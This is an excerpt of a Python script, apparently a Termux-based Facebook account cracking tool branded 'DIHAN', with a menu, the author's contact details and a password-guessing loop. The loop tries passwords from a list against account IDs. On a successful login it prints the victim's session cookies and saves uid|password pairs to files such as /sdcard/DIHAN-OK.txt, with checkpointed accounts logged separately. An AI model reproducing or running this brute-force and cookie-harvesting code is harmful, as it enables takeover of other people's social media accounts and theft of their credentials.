...
def o():
    ...
    if Mahin == '1':
        i()
    if Mahin == '2':
        os.system('xdg-open https://https://github.com/Dihu-69/ANONYMOUS-U7P4L ')
    if Mahin == '3':
        os.system('xdg-open https://https://github.com/Dihu-69/ANONYMOUS-U7P4L ')
    if Mahin == 'E':
        os.system('exit')
...
\033[1;32m  ╠══[Facebook:=====================> ANONYMOUS DIHAN     ║ 
\033[1;97m  ╠══[Whatsapp:=====================> 01996882125   ║
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print('\033[38;5;46m[DIHAN-OK] ' +uid+ '|' +ps+    '  \n   \033[1;33mCOOKIES : \033[38;5;46m'+coki+ ' ')                
                open('/sdcard/DIHAN-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print('\033[38;5;46m[DIHAN-CP] ' +uid+ '|' +ps+ '  \33[0;97m')
                open('/sdcard/DIHAN-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r    \33[1;93m[\033[1;95mDIHAN\033[0m/%s\33[1;93m]\033[1;97mOK-\033[38;5;46m%s'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
